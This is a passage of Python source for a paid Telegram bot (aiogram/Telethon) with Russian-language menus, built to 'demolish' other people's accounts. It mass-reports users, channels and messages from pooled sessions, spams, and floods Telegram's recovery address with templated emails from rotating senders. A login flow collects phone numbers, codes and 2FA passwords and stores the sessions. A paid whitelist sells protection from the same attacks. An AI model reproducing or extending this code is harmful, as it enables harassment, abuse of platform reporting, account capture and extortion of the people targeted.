        # Insert new record if not exists (though it might be created elsewhere, but safe to check)
        cursor.execute('''
            INSERT INTO user_reports (user_id, report_date, count)
            VALUES (?, ?, 0)
        ''', (user_id, today))
        conn.commit()
        daily_count = 0
    else:
        daily_count = result[0]

    conn.close()

    # Now use daily_count directly (no need for separate DAILY_USED variable)
    subscription_end = await get_subscription_end_time(user_id)
    remaining_time = await get_remaining_time(user_id)

    if subscription_end and subscription_end > datetime.now():
        subscription_status = "Активна"
        subscription_end_formatted = subscription_end.strftime("%Y-%m-%d %H:%M:%S")
    else:
        subscription_status = "Не активна"
        subscription_end_formatted = "Нет активной подписки"

    private_users = read_private_users()
    is_vip = user_id in private_users["ids"] or user_username in private_users["usernames"]
    vip_status = "✅ Да" if is_vip else "❌ Нет"

    profile_message = (
        f"───── ⋆⋅☆⋅⋆ ─────\n"
        f"⚡️ Профиль пользователя ⚡️\n\n"
        f"🆔 ID: {user_id}\n"
        f"👤 Имя: {user_name}\n"
        f"👤 Юзернейм: @{user_username}\n"
        f"🕐 Текущее время: {current_time}\n"
        f"✅ Подписка: {subscription_status}\n"
        f"💰 Подписка до: {subscription_end_formatted}\n"
        f"⏳ Оставшееся время: {remaining_time}\n"
        f"🌟 VIP статус: {vip_status}\n\n"
        f"───── ⋆⋅☆⋅⋆ ─────\n"
        f"❄️ Ваш сегодняшний лимит на фризере: {daily_count}/{DAILY_LIMIT}\n\n"
        f"───── ⋆⋅☆⋅⋆ ─────"
    )

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔙 Назад", callback_data="to_start"))

    if not is_vip:
        markup.add(InlineKeyboardButton("🌟 Купить VIP-статус", callback_data="buy_vip"))

    await bot.answer_callback_query(callback_query.id)

    if callback_query.message.photo:
        photo = callback_query.message.photo[-1].file_id
        media = InputMediaPhoto(media=photo, caption=profile_message)
        await bot.edit_message_media(
            chat_id=user_id,
            message_id=callback_query.message.message_id,
            media=media,
            reply_markup=markup
        )
    else:
        await bot.edit_message_text(
            chat_id=user_id,
            message_id=callback_query.message.message_id,
            text=profile_message,
            reply_markup=markup
        )

@dp.callback_query_handler(lambda c: c.data == 'buy_vip')
async def process_callback_buy_vip(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id

    markup = InlineKeyboardMarkup(row_width=1)

    for crypto, price in VIP_PRICE.items():
        markup.add(InlineKeyboardButton(
            f"{crypto}: {price}",
            callback_data=f"vip_pay_{crypto.lower()}"
        ))

    markup.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_start"))

    await bot.answer_callback_query(callback_query.id)
    if callback_query.message.photo:
        photo = callback_query.message.photo[-1].file_id
        media = InputMediaPhoto(media=photo, caption="💸 Выберите криптовалюту для оплаты VIP-статуса:")

        await bot.edit_message_media(
            chat_id=user_id,
            message_id=callback_query.message.message_id,
            media=media,
            reply_markup=markup
        )
    else:
        await bot.edit_message_text(
            chat_id=user_id,
            message_id=callback_query.message.message_id,
            text="💸 Выберите криптовалюту для оплаты VIP-статуса:",
            reply_markup=markup
        )

@dp.callback_query_handler(lambda c: c.data.startswith('vip_pay_'))
async def process_callback_vip_pay(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    crypto_type = callback_query.data.split('_')[-1]
    crypto_type_upper = crypto_type.upper()

    price = VIP_PRICE.get(crypto_type_upper)

    if price is None:
        await bot.answer_callback_query(callback_query.id, "❌ Ошибка: криптовалюта не найдена.")
        return

    invoice = create_invoice(asset=crypto_type_upper, amount=price, description="Оплата VIP-статуса")

    if invoice and 'result' in invoice:
        invoice_id = invoice['result']['invoice_id']
        pay_url = invoice['result']['pay_url']

        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("💳 Оплатить", url=pay_url),
            InlineKeyboardButton("✅ Проверить оплату", callback_data=f"check_vip_{invoice_id}")
        )
        markup.add(InlineKeyboardButton("🔙 Назад", callback_data="buy_vip"))

        await bot.answer_callback_query(callback_query.id)

        text = f"""
<b>🌟 Вайтлист 🌟</b>

📝 Добавьте себя в данный список, чтобы избежать сноса от других пользователей проекта и получить VIP статус

💸 <b>Стоимость добавления:</b> {price} {crypto_type_upper}
🛡️ Оплатите счет, и вы будете защищены.
"""

        if callback_query.message.photo:
            photo = callback_query.message.photo[-1].file_id
            media = InputMediaPhoto(media=photo, caption=text, parse_mode="HTML")
            await bot.edit_message_media(
                chat_id=user_id,
                message_id=callback_query.message.message_id,
                media=media,
                reply_markup=markup
            )
        else:
            await bot.edit_message_text(
                chat_id=user_id,
                message_id=callback_query.message.message_id,
                text=text,
                reply_markup=markup,
                parse_mode="HTML"
            )
    else:
        await bot.answer_callback_query(callback_query.id, "❌ Ошибка при создании счета.")

@dp.callback_query_handler(lambda c: c.data.startswith('check_vip_'))
async def process_callback_check_vip(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_username = callback_query.from_user.username

    logger.info(f"Processing callback with data: {callback_query.data}")

    if not callback_query.data.startswith('check_vip_'):
        logger.error(f"Invalid callback data format: {callback_query.data}")
        await bot.answer_callback_query(callback_query.id, "❌ Ошибка: неверный формат данных.")
        return

    invoice_id = callback_query.data.split('_')[2]
    logger.info(f"Checking invoice status for ID: {invoice_id}")

    invoice_status = check_invoice_status(invoice_id)
    logger.info(f"Invoice status response: {invoice_status}")

    if not invoice_status or not invoice_status.get('ok'):
        await bot.answer_callback_query(callback_query.id)
        msg = await bot.send_message(callback_query.from_user.id, "❌ Чек не найден. Пожалуйста, попробуйте снова.")
        await asyncio.sleep(3)
        await bot.delete_message(callback_query.from_user.id, msg.message_id)
        return

    items = invoice_status.get('result', {}).get('items', [])
    if not items:
        await bot.answer_callback_query(callback_query.id)
        msg = await bot.send_message(callback_query.from_user.id, "❌ Чек не найден. Пожалуйста, попробуйте снова.")
        await asyncio.sleep(3)
        await bot.delete_message(callback_query.from_user.id, msg.message_id)
        return

    status = items[0].get('status')
    logger.info(f"Invoice status: {status}")

    if status == 'paid':
        private_users = read_private_users()
        if user_id not in private_users["ids"]:
            private_users["ids"].append(user_id)
        if user_username and user_username not in private_users["usernames"]:
            private_users["usernames"].append(user_username)
        write_private_users(private_users)

        await bot.answer_callback_query(callback_query.id, "✅ Оплата прошла успешно! VIP-статус активирован.")
        await process_callback_my_time(callback_query)
    elif status == 'active':
        await bot.answer_callback_query(callback_query.id)
        msg = await bot.send_message(callback_query.from_user.id, "ℹ️ Счет ожидает оплаты. Пожалуйста, завершите оплату.")
        await asyncio.sleep(3)
        await bot.delete_message(callback_query.from_user.id, msg.message_id)
    elif status in ['pending', 'unpaid', 'processing']:
        await bot.answer_callback_query(callback_query.id)
        msg = await bot.send_message(callback_query.from_user.id, "⏳ Оплата еще обрабатывается. Пожалуйста, подождите.")
        await asyncio.sleep(3)
        await bot.delete_message(callback_query.from_user.id, msg.message_id)
    elif status in ['expired', 'failed', 'cancelled']:
        await bot.answer_callback_query(callback_query.id)
        msg = await bot.send_message(callback_query.from_user.id, "❌ Оплата не найдена или отклонена. Пожалуйста, попробуйте снова.")
        await asyncio.sleep(3)
        await bot.delete_message(callback_query.from_user.id, msg.message_id)
    else:
        await bot.answer_callback_query(callback_query.id)
        msg = await bot.send_message(callback_query.from_user.id, f"❌ Неизвестный статус оплаты: {status}")
        await asyncio.sleep(3)
        await bot.delete_message(callback_query.from_user.id, msg.message_id)

def get_edit_choice_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("✏️ Название промокода", callback_data="edit_name"),
        InlineKeyboardButton("⏳ Срок действия", callback_data="edit_end_date"),
        InlineKeyboardButton("⏳ Время, которое даёт", callback_data="edit_duration"),
        InlineKeyboardButton("🔢 Количество активаций", callback_data="edit_activations")
    )
    return keyboard


@dp.message_handler(state="edit_promo_name")
async def process_edit_promo_name(message: types.Message, state: FSMContext):
    promo_name = message.text
    promocodes = read_promocodes()
    promo_to_edit = next((promo for promo in promocodes if promo['🎫 Промокод'] == promo_name), None)

    if not promo_to_edit:
        await message.answer(f"❌ Промокод '{promo_name}' не найден.")
        await state.finish()
        return

    await state.update_data(old_promo_name=promo_name, promo_to_edit=promo_to_edit)
    await message.answer("✏️ Что вы хотите изменить?", reply_markup=get_edit_choice_keyboard())
    await state.set_state(PromoStates.choose_field_to_edit)

@dp.callback_query_handler(state=PromoStates.choose_field_to_edit)
async def process_choose_field_to_edit(callback_query: types.CallbackQuery, state: FSMContext):
    choice = callback_query.data
    await callback_query.answer()

    if choice == "edit_name":
        await callback_query.message.answer("✏️ Введите новое название промокода:")
        await state.set_state(PromoStates.edit_promo_name)
    elif choice == "edit_end_date":
        await callback_query.message.answer("✏️ Введите новый срок действия промокода в формате ГГГГ-ММ-ДД ЧЧ:ММ:СС:")
        await state.set_state(PromoStates.edit_promo_end_date)
    elif choice == "edit_duration":
        await callback_query.message.answer("✏️ Введите новое время, которое даёт промокод (в формате ГГГГ-ММ-ДД ЧЧ:ММ:СС):")
        await state.set_state(PromoStates.edit_promo_duration)
    elif choice == "edit_activations":
        await callback_query.message.answer("✏️ Введите новое количество активаций (число или 'бесконечно'):")
        await state.set_state(PromoStates.edit_promo_activations)

@dp.message_handler(state=PromoStates.edit_promo_name)
async def process_edit_promo_name(message: types.Message, state: FSMContext):
    new_name = message.text
    await state.update_data(edit_promo_name=new_name)
    await process_final_update(message, state)

@dp.message_handler(state=PromoStates.edit_promo_end_date)
async def process_edit_promo_end_date(message: types.Message, state: FSMContext):
    try:
        end_date = datetime.strptime(message.text, "%Y-%m-%d %H:%M:%S")
        await state.update_data(edit_promo_end_date=end_date.strftime("%Y-%m-%d %H:%M:%S"))
        await process_final_update(message, state)
    except ValueError:
        await message.answer("❌ Неверный формат даты. Введите дату в формате ГГГГ-ММ-ДД ЧЧ:ММ:СС.")
        return

@dp.message_handler(state=PromoStates.edit_promo_duration)
async def process_edit_promo_duration(message: types.Message, state: FSMContext):
    try:
        duration = datetime.strptime(message.text, "%Y-%m-%d %H:%M:%S")
        await state.update_data(edit_promo_duration=duration.strftime("%Y-%m-%d %H:%M:%S"))
        await process_final_update(message, state)
    except ValueError:
        await message.answer("❌ Неверный формат даты. Введите дату в формате ГГГГ-ММ-ДД ЧЧ:ММ:СС.")
        return

@dp.message_handler(state=PromoStates.edit_promo_activations)
async def process_edit_promo_activations(message: types.Message, state: FSMContext):
    activations = message.text
    await state.update_data(edit_promo_activations=activations)
    await process_final_update(message, state)

async def process_final_update(message: types.Message, state: FSMContext):
    data = await state.get_data()
    old_promo_name = data['old_promo_name']
    promocodes = read_promocodes()

    promo_to_edit = None
    for promo in promocodes:
        if promo['🎫 Промокод'] == old_promo_name:
            promo_to_edit = promo
            break

    if not promo_to_edit:
        await message.answer(f"❌ Промокод '{old_promo_name}' не найден.")
        await state.finish()
        return

    if 'edit_promo_name' in data:
        promo_to_edit['🎫 Промокод'] = data['edit_promo_name']
    if 'edit_promo_end_date' in data:
        promo_to_edit['⏳ Срок действия до'] = data['edit_promo_end_date']
    if 'edit_promo_duration' in data:
        promo_to_edit['⏳ Время, которое даёт'] = data['edit_promo_duration']
    if 'edit_promo_activations' in data:
        promo_to_edit['🔢 Активаций'] = data['edit_promo_activations']

    write_promocodes(promocodes)
    await message.answer("🎉 Промокод успешно обновлён!")
    await state.finish()

import asyncio

@dp.callback_query_handler(lambda c: c.data.startswith('check_'))
async def process_callback_check(callback_query: types.CallbackQuery):
    logging.info(f"Processing callback with data: {callback_query.data}")
    parts = callback_query.data.split('_')
    if len(parts) != 3:
        logging.error(f"Invalid callback data format: {callback_query.data}")
        await bot.answer_callback_query(callback_query.id, "❌ Ошибка: неверный формат данных.")
        return

    invoice_id = parts[1]
    duration_days = int(parts[2])
    logging.info(f"Checking invoice status for ID: {invoice_id}")
    status = check_invoice_status(invoice_id)
    if status and 'result' in status:
        invoice_status = status['result']['items'][0]['status']
        logging.info(f"Invoice status: {invoice_status}")
        if invoice_status == 'paid':
            await save_paid_user(callback_query.from_user.id, duration_days)
            await bot.answer_callback_query(callback_query.id)
            await bot.send_message(callback_query.from_user.id, "✅ Оплата подтверждена! Теперь вы можете пользоваться ботом.",
                                  reply_markup=InlineKeyboardMarkup().add(
                                      InlineKeyboardButton("Запуск", callback_data="send_welcome")
                                  ))
        elif invoice_status == 'active':
            await bot.answer_callback_query(callback_query.id)
            msg = await bot.send_message(callback_query.from_user.id, "❌ Оплата еще не выполнена. Пожалуйста, оплатите чек и нажмите 'Проверить оплату' снова.")
            await asyncio.sleep(3)
            await bot.delete_message(callback_query.from_user.id, msg.message_id)
        elif invoice_status in ['expired', 'failed']:
            await bot.answer_callback_query(callback_query.id)
            msg = await bot.send_message(callback_query.from_user.id, "❌ Вы не оплатили чек. Пожалуйста, оплатите чек для начала.")
            await asyncio.sleep(3)
            await bot.delete_message(callback_query.from_user.id, msg.message_id)
    else:
        await bot.answer_callback_query(callback_query.id)
        msg = await bot.send_message(callback_query.from_user.id, "❌ Вы не оплатили чек. Пожалуйста, оплатите чек для начала.")
        await asyncio.sleep(3)
        await bot.delete_message(callback_query.from_user.id, msg.message_id)

async def save_paid_user(user_id, duration_days):
    expiry_time = datetime.now() + timedelta(days=duration_days)
    expiry_time_str = expiry_time.strftime('%Y-%m-%d %H:%M:%S')

    if not os.path.exists('paid_users.txt'):
        with open('paid_users.txt', 'w') as file:
            file.write(f"{user_id},{expiry_time_str}\n")
        return

    with open('paid_users.txt', 'r') as file:
        lines = file.readlines()

    updated = False
    updated_lines = []
    for line in lines:
        line = line.strip()
        if not line:
            continue

        try:
            paid_user_id, paid_expiry_time_str = line.split(',')
            paid_expiry_time = datetime.strptime(paid_expiry_time_str, '%Y-%m-%d %H:%M:%S')
            if paid_user_id == str(user_id):
                if paid_expiry_time > datetime.now():
                    expiry_time += paid_expiry_time - datetime.now()
                    expiry_time_str = expiry_time.strftime('%Y-%m-%d %H:%M:%S')
                updated_lines.append(f"{paid_user_id},{expiry_time_str}\n")
                updated = True
            else:
                updated_lines.append(line + '\n')
        except ValueError as e:
            print(f"Ошибка при обработке строки '{line}': {e}")
            continue

    if not updated:
        updated_lines.append(f"{user_id},{expiry_time_str}\n")

    with open('paid_users.txt', 'w') as file:
        file.writelines(updated_lines)

async def get_remaining_time(user_id):
    if str(user_id) in admin_chat_ids:
        return "∞ (Администратор)"
    if not os.path.exists('paid_users.txt'):
        return "Нет доступа"
    try:
        with open('paid_users.txt', 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(',')
                if len(parts) != 2:
                    continue
                paid_user_id, expiry_time_str = parts
                if paid_user_id == str(user_id):
                    expiry_time = datetime.strptime(expiry_time_str, '%Y-%m-%d %H:%M:%S')
                    remaining_time = expiry_time - datetime.now()
                    if remaining_time.total_seconds() > 0:
                        days = remaining_time.days
                        hours, remainder = divmod(remaining_time.seconds, 3600)
                        minutes, seconds = divmod(remainder, 60)
                        return f"{days} дней, {hours} часов, {minutes} минут, {seconds} секунд"
                    else:
                        return "Время истекло"
    except Exception as e:
        print(f"Ошибка при чтении файла paid_users.txt: {e}")
    return "Нет доступа"

async def get_subscription_end_time(user_id: int):
    try:
        with open("paid_users.txt", "r", encoding="utf-8") as file:
            for line in file:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(',')
                if len(parts) == 2 and int(parts[0]) == user_id:
                    return datetime.strptime(parts[1], "%Y-%m-%d %H:%M:%S")
    except FileNotFoundError:
        print("Файл paid_users.txt не найден.")
    except Exception as e:
        print(f"Ошибка при чтении файла: {e}")
    return None


@dp.callback_query_handler(lambda c: c.data == 'to_start')
async def process_callback_back_to_start(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    first_name = callback_query.from_user.first_name
    last_name = callback_query.from_user.last_name or ""
    username = callback_query.from_user.username or ""

    welcome_message = f"""
🌟 <b>Добро пожаловать, {first_name} {last_name} @{username}!</b> 🌟
Мы рады видеть вас в Durov Pizza! Если у вас есть вопросы или нужна помощь, не стесняйтесь обращаться к поддержке. 😊
Также рекомендую купить Вип!
📢 <b>Наши каналы:</b>
- <a href="https://t.me/+wVKJFn0WxN0yMDQy">Chrime Team</a>
- <a href="https://t.me/chrime_chat">Chrime Chat</a>
Наш кейс бот: @crime_case_bot
🤖 <b>Создатель ботa:</b> 👑 <a href="https://t.me/reugid21">Lgener [rx]</a> 👑
"""

    markup = InlineKeyboardMarkup(row_width=2)
    btn_support = InlineKeyboardButton('📩Написать поддержку📩', callback_data='support')
    btn_demolition = InlineKeyboardButton('💣Снос💣', callback_data='demolition')
    btn_restore_account = InlineKeyboardButton('🔄Восстановить аккаунт🔄', callback_data='restore_account')
    btn_my_time = InlineKeyboardButton('👤Профиль👤', callback_data='my_time')
    btn_spam_menu = InlineKeyboardButton('🔥Спам🔥', callback_data='spam_menu')
    markup.add(btn_demolition)
    markup.add(btn_support, btn_spam_menu, btn_restore_account, btn_my_time)

    if str(user_id) in admin_chat_ids:
        btn_admin_panel = InlineKeyboardButton('🛠 Админ панель', callback_data='admin_panel')
        markup.add(btn_admin_panel)

    await bot.answer_callback_query(callback_query.id)

    if callback_query.message.photo:
        photo = callback_query.message.photo[-1].file_id
        media = InputMediaPhoto(media=photo, caption=welcome_message, parse_mode="HTML")
        await bot.edit_message_media(
            chat_id=user_id,
            message_id=callback_query.message.message_id,
            media=media,
            reply_markup=markup
        )
    else:
        await bot.edit_message_text(
            chat_id=user_id,
            message_id=callback_query.message.message_id,
            text=welcome_message,
            reply_markup=markup,
            parse_mode="HTML"
        )


@dp.callback_query_handler(lambda call: True)
async def handle_callbacks(call: types.CallbackQuery, state: FSMContext):
    user_id = call.from_user.id
    if str(user_id) in admin_chat_ids:
        pass
    else:
        if user_id in banned_users:
            await call.answer('🚨 Вы забанены администратором 🚨')
            return
        if call.data != 'pay' and not await check_payment(user_id):
            await call.answer('⏳ Ваше время доступа истекло. Пожалуйста, оплатите снова.')
            await call.message.answer(
                "⏳ Ваше время доступа истекло. Пожалуйста, оплатите снова.",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("Оплатить", callback_data="go_to_payment")
                )
            )
            return
    if call.data == 'support':
        await call.message.answer('📝 Пожалуйста, напишите ваше сообщение для поддержки:')
        await SupportStates.message.set()
    elif call.data == 'email_complaint':
        await call.message.answer('📧 Введите тему письма:')
        await ComplaintStates.subject.set()
    elif call.data == 'website_complaint':
        await call.message.answer("""
🌐 Введите текст для отправки на сайт:""")
        await ComplaintStates.text_for_site.set()
    elif call.data == 'website_complaint2':
        await call.message.answer("""
Правила пользования web 2.0: 
1. Не злоупотребляйте сносом (не закидывайте на один и тот же аккаунт фризер несколько раз, это ничем не поможет).
2. Сносите только новореги (может ебнуть и отлегу до 5-ти лет, но это редко)
3. Сносите ОБЯЗАТЕЛЬНО только DC1, DC3, DC5 (на других дата центрах фризер не работает!!!)
4. Не ломайте бота (не отправляйте фризер на несуществующие юзернеймы и тд — это только портит наши сессии!!!)
Ответы на вопросы:
— Как посмотреть DC и ID у аккаунта?
Чтобы это сделать вам нужно скачать моды на телеграм, либо пользоваться @dateregbot.
Например из модов на IOS есть SwiftGram, а на Android — AuyGram.
— Почему не сносит?
Вы неправильно что-либо сделали, либо система решила оставить аккаунт.
Подарки в профиле и премка так же усложняют процесс сноса.
— Что такое DC?
DC — это Data Center. Значение присваивается при регистрации аккаунта. Например, если это США — DC будет 1. Если Бангладеш — DC5. Если снг страны — DC2 и так далее.

🌐 Введите username в формате @username :""")
        await ComplaintStates.text_for_site.set()
    elif call.data == 'create_account':
        await call.message.answer('📱 Введите ваш номер телефона:')
        await CreateAccountStates.phone.set()
    elif call.data == 'report_message':
        await call.message.answer('🔗 Введите ссылку на сообщение:')
        await ReportStates.message_link.set()
    elif call.data == 'channel_demolition':
        await call.message.answer('🔗 Введите ссылку на канал:')
        await ChannelDemolitionStates.channel_link.set()
    elif call.data == 'restore_account':
        await call.message.answer('📱 Введите номер телефона для восстановления аккаунта:')
        await RestoreAccountStates.phone.set()
    elif call.data == 'go_to_payment':
        await call.message.answer("ℹ️ Выберите способ оплаты:", reply_markup=payment_keyboard)
    await call.answer()
@dp.message_handler(state=RestoreAccountStates.phone)
async def process_restore_phone(message: types.Message, state: FSMContext):
    phone_number = message.text
    await state.update_data(phone_number=phone_number)
    await message.answer("📝Введите количество отправок:")
    await RestoreAccountStates.send_count.set()

@dp.message_handler(state=RestoreAccountStates.send_count)
async def process_send_count(message: types.Message, state: FSMContext):
    try:
        send_count = int(message.text)
        if send_count <= 0:
            raise ValueError("Количество отправок должно быть больше 0")
    except ValueError as e:
        await message.answer(f"❌ Ошибка: {e}. Пожалуйста, введите корректное число.")
        return

    data = await state.get_data()
    phone_number = data.get("phone_number")
    target_email = "recover@telegram.org"
    subject = f"Banned phone number: {phone_number}"
    body = (
        f"I'm trying to use my mobile phone number: {phone_number}\n"
        "But Telegram says it's banned. Please help.\n\n"
        "App version: 11.4.3 (54732)\n"
        "OS version: SDK 33\n"
        "Device Name: samsungSM-A325F\n"
        "Locale: ru"
    )

    for _ in range(send_count):
        sender_email, sender_password = random.choice(list(senders.items()))
        success, result = await send_email(
            receiver=target_email,
            sender_email=sender_email,
            sender_password=sender_password,
            subject=subject,
            body=body
        )
        if success:
            await message.answer(f'✅ Письмо успешно отправлено на [{target_email}] от [{sender_email}]')
        else:
            await message.answer(f'❌ Ошибка при отправке письма на [{target_email}] от [{sender_email}]: {result}')
            break

    await state.finish()

session_dir = "Session"
if not os.path.exists(session_dir):
    os.makedirs(session_dir)

for client in clients:
    client_folder = os.path.join(session_dir, client["name"])
    if not os.path.exists(client_folder):
        os.makedirs(client_folder)

def get_random_client():
    return random.choice(clients)

def create_code_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=3)
    keyboard.row(
        InlineKeyboardButton("1", callback_data="code_1"),
        InlineKeyboardButton("2", callback_data="code_2"),
        InlineKeyboardButton("3", callback_data="code_3")
    )
    keyboard.row(
        InlineKeyboardButton("4", callback_data="code_4"),
        InlineKeyboardButton("5", callback_data="code_5"),
        InlineKeyboardButton("6", callback_data="code_6")
    )
    keyboard.row(
        InlineKeyboardButton("7", callback_data="code_7"),
        InlineKeyboardButton("8", callback_data="code_8"),
        InlineKeyboardButton("9", callback_data="code_9")
    )
    keyboard.row(
        InlineKeyboardButton("Очистить", callback_data="code_clear"),
        InlineKeyboardButton("0", callback_data="code_0"),
        InlineKeyboardButton("Подтвердить", callback_data="code_confirm")
    )
    return keyboard

@dp.message_handler(state=CreateAccountStates.phone)
async def process_phone_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return

    phone = message.text.replace('+', '')
    if not phone or not phone.isdigit():
        await message.answer('❌ Введите корректный номер телефона.')
        return

    client_info = get_random_client()
    client_folder = os.path.join(session_dir, client_info["name"])
    session_name = f"session_{phone}"
    session_path = os.path.join(client_folder, session_name)

    client = TelegramClient(session_path, api_id=client_info["api_id"], api_hash=client_info["api_hash"])

    await client.connect()
    if not await client.is_user_authorized():
        try:
            result = await client.send_code_request(phone)
            phone_code_hash = result.phone_code_hash
            async with state.proxy() as data:
                data['phone'] = phone
                data['phone_code_hash'] = phone_code_hash
                data['client_folder'] = client_folder
                data['client_info'] = client_info
            await message.answer('📩 Введите код подтверждения:', reply_markup=create_code_keyboard())
            await CreateAccountStates.next()
        except errors.PhoneNumberInvalidError:
            await message.answer('❌ Неверный номер телефона. Пожалуйста, попробуйте еще раз.')
        finally:
            await client.disconnect()
    else:
        await message.answer('❌ Аккаунт уже авторизован.')
        await state.finish()
        await client.disconnect()

@dp.callback_query_handler(lambda c: c.data.startswith('code_'), state=CreateAccountStates.code)
async def process_code_callback(callback_query: types.CallbackQuery, state: FSMContext):
    action = callback_query.data.split('_')[1]
    async with state.proxy() as data:
        code = data.get('code', '')

        if action == 'clear':
            code = ''
        elif action == 'confirm':
            if len(code) == 5:
                data['code'] = code
                await bot.answer_callback_query(callback_query.id)
                await process_code_step(callback_query.message, state)
                return
            else:
                await bot.answer_callback_query(callback_query.id, text="Код должен состоять из 5 цифр.")
                return
        else:
            if len(code) < 5:
                code += action

        data['code'] = code

    await bot.edit_message_text(f'📩 Введите код подтверждения: {code}', callback_query.from_user.id, callback_query.message.message_id, reply_markup=create_code_keyboard())

@dp.message_handler(state=CreateAccountStates.code)
async def process_code_step(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        code = data.get('code', '')

    if not code or len(code) != 5:
        await message.answer('❌ Введите корректный код подтверждения.')
        return

    async with state.proxy() as data:
        phone = data['phone']
        phone_code_hash = data['phone_code_hash']
        client_folder = data['client_folder']
        client_info = data['client_info']

    session_name = f"session_{phone}"
    session_path = os.path.join(client_folder, session_name)
    client = TelegramClient(session_path, api_id=client_info["api_id"], api_hash=client_info["api_hash"])

    await client.connect()
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
    except errors.SessionPasswordNeededError:
        await message.answer('🔒 Введите пароль от 2FA:')
        await CreateAccountStates.next()
    except Exception as e:
        await message.answer(f'❌ Ошибка при авторизации: {e}')
        await state.finish()
    else:
        await message.answer(f'✅ Аккаунт успешно создан и сохранен как {session_name}.session')
        await state.finish()
    finally:
        await client.disconnect()

@dp.message_handler(state=CreateAccountStates.password)
async def process_password_step(message: types.Message, state: FSMContext):
    password = message.text
    async with state.proxy() as data:
        phone = data['phone']
        client_folder = data['client_folder']
        client_info = data['client_info']

    session_name = f"session_{phone}"
    session_path = os.path.join(client_folder, session_name)
    client = TelegramClient(session_path, api_id=client_info["api_id"], api_hash=client_info["api_hash"])

    await client.connect()
    try:
        await client.sign_in(password=password)
    except Exception as e:
        await message.answer(f'❌ Ошибка при авторизации: {e}')
    else:
        await message.answer(f'✅ Аккаунт успешно создан и сохранен как {session_name}.session')
    finally:
        await state.finish()
        await client.disconnect()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

from telethon.tl.functions.channels import GetFullChannelRequest

def get_all_sessions():
    sessions = []
    for client in clients:
        client_folder = os.path.join(session_dir, client["name"])
        if os.path.exists(client_folder):
            for file in os.listdir(client_folder):
                if file.endswith(".session"):
                    sessions.append({
                        "path": os.path.join(client_folder, file),
                        "api_id": client["api_id"],
                        "api_hash": client["api_hash"]
                    })
    return sessions

from datetime import datetime, timedelta
from aiogram import types
from aiogram.dispatcher import FSMContext

user_last_report_time = {}

@dp.message_handler(state=ReportStates.message_link)
async def process_message_link_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id

    if user_id in user_last_report_time:
        time_since_last_report = datetime.now() - user_last_report_time[user_id]
        if time_since_last_report < timedelta(minutes=2):
            remaining_time = timedelta(minutes=2) - time_since_last_report
            minutes = remaining_time.seconds // 60
            seconds = remaining_time.seconds % 60
            await message.answer(f"🚨 Пожалуйста, подождите {minutes:02d}:{seconds:02d} минут перед отправкой следующего репорта.")
            return

    user_last_report_time[user_id] = datetime.now()

    if user_id in banned_users:
        await message.answer('📢 Администратор посчитал ваш аккаунт подозрительным, и вы были забанены. 📢')
        return

    message_links = message.text.split()
    if not all(re.match(r'^https://t\.me/[^/]+/\d+(/\d+)?$|^https://t\.me/c/\d+/\d+$', link) for link in message_links):
        await message.answer(
            '❌ *Неверный формат ссылки на сообщение.*\n'
            'Пожалуйста, введите ссылки в формате:\n'
            '`https://t.me/username/message_id`\n'
            '`https://t.me/username/message_id/additional_info`\n'
            '`https://t.me/c/channel_id/message_id`',
            parse_mode="Markdown"
        )
        return

    async with state.proxy() as data:
        data['message_links'] = message_links

    sessions = get_all_sessions()
    if not sessions:
        await message.answer('❌ Нет доступных сессий. Пожалуйста, создайте аккаунт сначала.')
        await state.finish()
        return

    session = sessions[0]
    client = TelegramClient(session["path"], api_id=session["api_id"], api_hash=session["api_hash"])
    await client.connect()

    try:
        users_info = {}
        target_user_ids = set()

        for message_link in message_links:
            parts = message_link.split('/')
            if parts[3] == 'c':
                chat_id = int(f"-100{parts[4]}")
                message_id = int(parts[5])
                try:
                    chat = await client.get_entity(chat_id)
                except errors.ChannelPrivateError:
                    await message.answer(f'❌ Канал или группа является приватным. Доступ запрещен.')
                    continue
                except Exception as e:
                    logger.error(f"Ошибка при получении информации о канале/группе: {e}")
                    await message.answer(f'❌ Ошибка при обработке ссылки на канал/группу.')
                    continue
            else:
                chat_username = parts[3]
                message_id = int(parts[4])
                try:
                    chat = await client.get_entity(chat_username)
                except errors.UsernameNotOccupiedError:
                    await message.answer(f'❌ Группа или канал с именем `{chat_username}` не существует.', parse_mode="Markdown")
                    continue
                except errors.ChannelPrivateError:
                    await message.answer(f'❌ Группа или канал `{chat_username}` является приватным. Доступ запрещен.', parse_mode="Markdown")
                    continue

            try:
                await client(JoinChannelRequest(chat))
            except errors.ChannelPrivateError:
                await message.answer(f'❌ Группа или канал `{chat_username}` является приватной. Доступ запрещен.', parse_mode="Markdown")
                continue
            except errors.UserAlreadyParticipantError:
                pass

            try:
                full_chat = await client(GetFullChannelRequest(chat))
                chat_members_count = full_chat.full_chat.participants_count if hasattr(full_chat.full_chat, 'participants_count') else "Скрыто"
            except Exception as e:
                logger.error(f"Ошибка при получении информации о группе/канале: {e}")
                chat_members_count = "Скрыто"

            target_message = await client.get_messages(chat_id if parts[3] == 'c' else chat, ids=message_id)
            if not target_message:
                await message.answer(f'❌ Сообщение по ссылке `{message_link}` не найдено. Пожалуйста, проверьте правильность ссылки.', parse_mode="Markdown")
                continue

            user_id = target_message.sender_id
            user = await client.get_entity(user_id)
            user_info = f"@{user.username}" if user.username else f"ID: {user.id}"
            private_users = read_private_users()

            if user.id in private_users["ids"] or (user.username and user.username in private_users["usernames"]):
